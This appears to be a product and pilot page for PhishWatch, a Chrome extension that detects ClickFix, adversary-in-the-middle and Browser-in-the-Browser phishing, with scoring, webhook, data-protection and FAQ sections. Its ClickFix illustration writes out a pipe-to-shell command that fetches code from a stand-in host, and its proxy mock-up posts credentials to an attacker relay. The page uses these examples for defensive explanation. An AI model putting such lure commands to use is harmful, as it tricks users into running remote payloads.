01The problem

Why these attacks bypass
everything already in place.

Modern phishing does not arrive as a suspicious email with a malicious attachment. It arrives as a clean link — passing every filter — and activates inside the browser, at the moment the user interacts with it.

ClickFix lure
verify-page.xyz
// Confirm you are human
Press ⌘ + V in Terminal
$ curl -fsSL https://x.tk/i | zsh
ClickFix
Windows + Mac

A webpage injects a malicious command into the user's clipboard and instructs them to paste it into PowerShell or Terminal. On Mac: curl|zsh, osascript, base64-encoded payloads. On Windows: PowerShell via the Run dialog.

Why tools miss it: No email attachment. No file download. No known-bad domain at scan time. The attack executes via a legitimate OS tool — EDR sees a normal process.
AiTM proxy
login.microsoftonline.com
Real login →
ms-login-portal.click
email · password · MFA code
POST → relay.attacker.net
AiTM — Adversary-in-the-Middle
Windows + Mac

A reverse proxy sits between the user and the real login page. The user completes MFA. The proxy captures the authenticated session cookie in real time. Used by Tycoon 2FA — 2,000+ operators before Europol & Microsoft dismantled it in March 2026.

Why tools miss it: MFA is bypassed because the post-authentication token is captured, not the password. The phishing URL is clean. Domain reputation is normal.
Browser-in-the-Browser
free-promo.app
🔒 accounts.google.com
Sign in · drawn by page
Browser-in-the-Browser
Windows + Mac

A fake browser window rendered inside a web page using HTML and CSS. Looks exactly like a legitimate OAuth popup — complete with a convincing fake address bar. The browser's real security indicators are absent because there is no real popup.

Why tools miss it: Security awareness training tells users to check the URL bar. BitB defeats this — the fake bar is drawn by the page, not the browser.

The shared characteristic

All three attacks activate after delivery — inside the browser, after the user clicked a link that every perimeter tool passed as safe. The attack surface is the browser interaction layer, which existing security stacks do not instrument. A security engineer with EDR, detection engineering, and a SIEM described this gap recently on Reddit: "Our detection engineering has been largely unchanged… I am surprised at the rate at which I am seeing them."

Detection at the browser layer,
before credentials are exposed.

Sent to backend

03Risk levels & decisions

Three risk levels.
One consistent experience.

Every URL is assessed and assigned a risk band. The band determines what the user sees and what is recorded in the dashboard.

Lowscore < 20

Silent scan

Minor signals only — suspicious TLD, URL shortener, long query string. No strong indicator present. Navigation continues silently. Scan event recorded in dashboard.

Mediumscore 20–59

Warning overlay shown

Meaningful signals — cross-origin credential form, multiple redirects, newly registered domain, typosquatting match. Overlay appears explaining what was detected. User decides.

Highscore ≥ 60

Strong warning + webhook

Strong signals — ClickFix command injection, BitB fake window, AiTM session relay. Overlay with specific explanation. If session-incident conditions are met, webhook fires immediately.

As with any security tool, you may occasionally see a warning on a site you trust. The overlay always lets you proceed — PhishWatch never blocks. A one-click false-positive report sits in every warning; every report goes directly to me and is reviewed the same day.

Warning vs decision — what's the difference?

A warning is when the overlay appears. A decision is what the user does with it: go back, proceed anyway, or report a false positive. Both are recorded separately. A high warning rate with a high proceed rate suggests users are dismissing genuine alerts — a training signal. A high false-positive rate suggests a signal needs recalibrating.

How scoring works

Signal weights are summed (range 5–85 per signal). The total is clamped by the highest severity present — if all signals are LOW, the score cannot exceed 19 regardless of how many fire. This prevents many weak signals stacking into a false HIGH. A single HIGH-severity signal (such as mac_clickfix_lure) can push the score to HIGH on its own.

Treadmill detection — how AiTM is caught

When a user focuses on a credential field or submits a login form, PhishWatch opens a short observation window. During this window, it monitors the destination of network requests — not their content. If a request goes to a different server than the page the user is interacting with, during the authentication window, that is the structural signature of a session relay attack. The window closes when the interaction ends. No continuous monitoring. No content is ever read or stored.

06Webhook integration

Incidents in your PSA
the moment they happen.

When PhishWatch detects a high-severity event, it fires a JSON webhook to any HTTPS endpoint you configure. Connects to ConnectWise, Jira, Slack, PagerDuty — anything that accepts a POST.

Events that trigger a webhook

session_incident

Complete attack sequence detected — a redirect chain followed by a credential form submitting to a non-matching origin. Always HIGH risk. Contains: credential_post_origin, redirect_origins, elapsed_seconds.

credential_interaction

Credential form detected whose action submits to a cross-origin domain. Risk band varies. Contains: form_action_domain, cross_origin_submit flag.

Webhooks do not fire for routine scans, low-risk navigations, or overlay warnings alone — only the two high-severity events above. This keeps webhook volume manageable even for active users.

07Data handling & compliance

What is collected.
What is never touched.

PhishWatch is a security product. The data-handling architecture is designed to be auditable, not just documented.

Never collected
  • Page content, HTML, or DOM structure
  • Passwords or form values
  • Clipboard text content
  • Cookies or session tokens
  • Full URLs (path or query string)
  • Personal identifiers or names
  • Browsing history
  • IP addresses (by default)
Sanitisation enforced via sanitizeClientSignals() — approved signal list only; unknown fields fail closed. DOM structure is analysed locally to detect cloned login pages. Only a boolean match result is included in signal metadata — page content is never transmitted.
Is collected
  • Destination domain name only
  • Signal IDs and severity levels
  • Risk band (low / medium / high)
  • Anonymous session UUID (random, no link to a person)
  • User decision (proceed / cancel / false-positive)
  • Extension version and timestamp
  • tenant_id (set by MSP via managed policy)
Per-tenant data isolation enforced at query level. Postgres hosted in Frankfurt with daily backups and point-in-time recovery (Render-managed). 90-day automatic retention via scheduled purge jobs.

Who owns the data and what happens after the pilot

The MSP's telemetry data belongs to the MSP. PhishWatch processes it as a data processor under GDPR Art. 28 — the MSP is the controller. On request, all data for a tenant is deleted within 72 hours. At the end of the pilot, data is retained for 90 days then automatically deleted. There is no secondary use of data, no sale of data, and no aggregation that could identify an individual user.

Legal and compliance documents

GDPR Art. 28 — Data Processing Agreement
Parties

Data Controller: the MSP (Partner). Data Processor: Deborshi Seal, an individual trading as PhishWatch, Berlin, Germany.

Subject matter and nature of processing

PhishWatch processes telemetry data generated by the Chrome extension deployed on the Partner's client devices. Processing consists of: receiving telemetry events, storing them in a Postgres database, making them available via the MSP dashboard API, and automatically deleting events older than 90 days.

Purpose of processing

Detection and analysis of browser-native phishing attack patterns for the purpose of protecting end users and providing the MSP with security visibility into their client deployments.

Employees and users of the MSP's client companies who use Chrome with the PhishWatch extension installed.

Categories of personal data

Anonymous session UUIDs (randomly generated, no link to any natural person), timestamps, and domain names visited. No names, email addresses, IP addresses (by default), or any other directly or indirectly identifying information is processed.

Duration of processing

For the duration of the pilot agreement, plus the 90-day automatic retention period. Data is deleted within 72 hours of a written deletion request to security@phishwatch.io.

Sub-processors

Render Inc. (US) — managed Postgres database hosted in Frankfurt, Germany region. Render operates as a data processor under a data processing agreement.

Technical and organisational measures

Postgres encryption at rest (Render managed) hosted in Frankfurt with daily backups and point-in-time recovery. TLS 1.2+ for all data in transit. Hashed API keys — plaintext never stored. Parameterised SQL throughout — no injection surface. Per-tenant data isolation enforced at query level. 90-day automatic retention via scheduled purge jobs; on-request deletion within 72h.

Data subject rights

Given that no personally identifying data is processed (session UUIDs are random and cannot be linked to any individual without additional information held by the Controller), data subject rights under GDPR Art. 15–22 are satisfied structurally rather than procedurally. The Controller (MSP) retains full control over deletion via the deletion request process.

Security posture
Extension security

Chrome Manifest V3 with strict Content Security Policy. No eval, no remote code execution. Content scripts run in an isolated world — page JavaScript cannot access or modify extension logic. sanitizeClientSignals() validates all client-supplied data before use, preventing injection via malicious page content.

Backend security

Parameterised SQL throughout — no SQL injection surface. Tenant API keys stored as SHA-256 hashes only — plaintext never persists. Timing-safe comparison (hmac.compare_digest) for access-code validation. Per-IP rate limiting on all public endpoints. Request body size limit (64KB default). OpenAPI documentation endpoints disabled in production.

Data minimisation

The extension transmits domain names and signal IDs only. URL paths, query parameters, page content, clipboard content, and credentials never leave the browser process. This is structural — the extension does not access this data for transmission purposes.

Infrastructure

Backend hosted on Render (Frankfurt region). Postgres managed by Render with encryption at rest. All traffic over TLS 1.2+. No client IP addresses stored by default.

09Frequently asked questions

Questions we expect
you will have.

How is this different from Google Safe Browsing, which is already in Chrome?
Google Safe Browsing checks URLs against lists of known-bad domains — it detects yesterday's attacks. An attacker with a fresh domain running a ClickFix page is invisible to Safe Browsing for hours or days. PhishWatch detects the mechanic — clipboard injection, fake browser windows, session relay — regardless of whether the domain is known. A brand-new domain on its first day can be detected if it uses one of the attack mechanics PhishWatch monitors.
Does it work alongside Microsoft Defender or CrowdStrike?
Yes, without conflict. PhishWatch operates at the Chrome extension layer. It does not touch the OS, hook system APIs, intercept network traffic at the OS level, or compete for file system events. It coexists with any EDR, AV, or network security tool without interference. This is by design — PhishWatch covers the browser interaction layer, which EDR tools are not designed for.
What does the end user actually see?
If the risk is low, nothing — they navigate normally. If medium or high, a warning overlay appears explaining specifically what was detected and why it is suspicious. Three options: go back to safety, proceed anyway (with the decision recorded), or report as a false positive. The overlay is clear and non-alarming. PhishWatch never blocks navigation — the user always retains final control.
What if the backend goes down?
The extension fails open. All local detection modules continue running — ClickFix, ConsentFix, BitB, credential keyword analysis, treadmill detection — without any backend call. Cloud-assisted scoring (typosquatting, newly registered domain) is temporarily unavailable, but the extension keeps protecting users. Browsing is never blocked or interrupted.
What is the false positive rate?
Unknown — PhishWatch has not yet had significant real-world deployment. The pilot is designed in part to measure this in a real MSP environment. Based on the test suite (23 false positive test cases passing) and existing suppression conditions, the rate should be low for normal business browsing. Every false positive report is reviewed and a suppression fix issued the same day. You receive an email confirmation when it is resolved.
Does it work on Mac as well as Windows?
Yes. Mac-specific ClickFix detection was added in March 2026, based on threat intelligence from Sophos, Datadog, and Intego documenting a significant increase in Mac-targeted campaigns. curl|zsh, osascript, and base64-encoded terminal command patterns are all detected. The official Homebrew installer is explicitly excepted so developers do not see false positives on legitimate tooling installation.
Does Chrome Enterprise licensing need to be in place?
Chrome Enterprise licensing is required for managed force-install via Google Admin Console, but the extension works identically when installed via Windows Group Policy or RMM scripts without a Chrome Enterprise licence. For a small pilot, manual installation from the Chrome Web Store also works — though managed configuration (auto-setting the tenant_id) does require a policy mechanism.
Does a session_incident mean credentials were definitely stolen?
No. A session_incident means the browser exhibited the structural pattern of an attack — a redirect chain followed by a credential form submitting to a non-matching origin. It does not confirm that credentials were stolen. The user may have stopped before submitting, the session may have been a false positive, or the form submission may have failed. Treat session incidents as high-priority alerts requiring human review, not as confirmed breaches.
What happens to data after the pilot?
Data is retained for 90 days then automatically deleted. If you want data deleted immediately at the end of the pilot, email security@phishwatch.io with your tenant_id and all data for that tenant is deleted within 72 hours. If the pilot continues commercially, data retention terms are agreed in the commercial agreement. No data is shared with third parties or used for any purpose beyond operating the PhishWatch service.
What does it cost after the pilot?
Pricing has not been set. The pilot is entirely free with no commitment. After the pilot, if you want to continue, we discuss pricing based on the number of client deployments and features used. The goal is a model that makes PhishWatch net-positive for your margins when offered as part of your security stack. There is no automatic billing and no pressure to continue.
